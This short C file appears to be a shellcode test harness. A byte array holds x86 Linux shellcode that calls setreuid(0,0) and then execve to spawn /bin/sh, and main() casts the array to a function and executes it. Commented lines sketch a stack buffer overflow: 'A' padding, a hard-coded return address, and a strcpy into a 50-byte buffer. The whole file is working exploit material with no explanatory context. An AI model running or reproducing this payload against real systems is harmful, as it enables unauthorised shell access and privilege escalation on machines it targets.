char code[] = "\x31\xc0\xb0\x46\x31\xdb\x31\xc9\xcd\x80\xeb\x07"
              "\x5b\x31\xc0\xb0\x0b\xcd\x80\xe8\xf4\xff\xff\xff"
              "\x2f\x62\x69\x6e\x2f\x73\x68";
              // "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"
              // "\xde\xf2\xff\xbf";

int main(int argc, char *argv[])
{
   int (*func)();
   func = ( int (*)() ) code;
   (int)(*func)();

   // char buf[50];
   // strcpy( buf, code );
   // return 0;
}
